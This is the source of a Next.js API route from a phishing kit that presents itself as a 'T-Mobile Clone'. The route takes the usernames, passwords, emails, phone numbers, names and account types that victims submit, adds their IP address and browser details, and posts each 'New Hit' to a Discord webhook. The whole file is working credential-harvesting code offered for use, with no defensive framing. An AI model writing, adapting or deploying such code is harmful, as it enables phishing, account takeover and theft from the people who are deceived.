import { NextResponse } from 'next/server';
import { headers } from 'next/headers';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const {
      username,
      password,
      email,
      type,
      firstName,
      lastName,
      phone,
      accountType,
      ...rest
    } = body;

    const headersList = await headers();
    let ip = headersList.get('x-forwarded-for')?.split(',')[0].trim() || 'Unknown IP';
    if (ip === '::1' || ip === '127.0.0.1') ip = 'Localhost (Testing)';

    const userAgent = headersList.get('user-agent') || 'Unknown Device';

    const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

    // Improved Smart Detection
    let finalEmail = "N/A";
    let finalPhone = "N/A";

    const input = username || email || "";

    if (input.includes('@')) {
      finalEmail = input;
    } else if (/^\(?[\d\s().+-]{10,}/.test(input)) {
      finalPhone = input;
    } else {
      finalEmail = input; // fallback
    }

    const embed = {
      title: `🔴 T-Mobile Clone • New Hit`,
      description: `**Type:** \`${type?.toUpperCase() || 'UNKNOWN'}\``,
      color: 0xff0000,
      timestamp: new Date().toISOString(),
      fields: [
        { 
          name: "👤 Account", 
          value: username || "Not provided", 
          inline: false 
        },
        { 
          name: "🔑 Password", 
          value: password ? `\`\`\`${password}\`\`\`` : "`N/A`", 
          inline: false 
        },
        { name: "📱 Phone", value: finalPhone, inline: true },
        { name: "✉️ Email", value: finalEmail, inline: true },
      ],
      footer: { text: `IP: ${ip}` }
    };

    if (firstName || lastName) {
      embed.fields.push({ 
        name: "👥 Full Name", 
        value: `${firstName || ''} ${lastName || ''}`.trim() || "N/A", 
        inline: true 
      });
    }
    if (accountType) {
      embed.fields.push({ name: "🏠 Account Type", value: accountType, inline: true });
    }

    embed.fields.push({
      name: "🌐 IP Address",
      value: `\`${ip}\``,
      inline: true
    });

    embed.fields.push({
      name: "📱 Device / Browser",
      value: `\`\`\`${userAgent.slice(0, 120)}${userAgent.length > 120 ? '...' : ''}\`\`\``,
      inline: false
    });

    const discordMessage = { 
      content: `**New Hit Received**`, 
      embeds: [embed] 
    };

    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(discordMessage),
    });

    console.log(`✅ Sent | Type: ${type}`);
    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('❌ Error:', error);
    return NextResponse.json({ success: false }, { status: 500 });
  }
}
